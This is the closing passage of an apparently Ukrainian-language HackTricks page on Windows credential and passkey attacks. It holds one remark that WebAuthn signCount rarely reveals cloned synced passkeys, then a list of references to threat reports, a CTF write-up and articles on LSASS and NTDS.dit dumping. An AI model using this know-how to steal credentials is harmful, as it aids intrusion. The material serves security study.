- Пам’ятайте, що WebAuthn **`signCount`** часто не допомагає виявляти клоновані synced passkeys, оскільки його значення може залишатися незмінним, тож класичне виявлення клонів ненадійне.

## References

- [1] [Unit 42 – Розслідування багаторічних непомічених операцій, спрямованих на критично важливі сектори](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: фішинг через макрос Word VBA за SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Усередині Ink Dragon: розкриття мережі ретрансляції та внутрішніх механізмів прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: нова поверхня атаки в безпарольній автентифікації](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / зберігання ключів CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Як насправді працює сховище даних Active Directory: усередині NTDS.dit (частина 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Віддалене отримання дампа паролів LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho розширює свій арсенал кібер шпигунства за допомогою набору інструментів Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – функція CreateFileW і `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – режим резервного копіювання Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – завершення активних сеансів](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
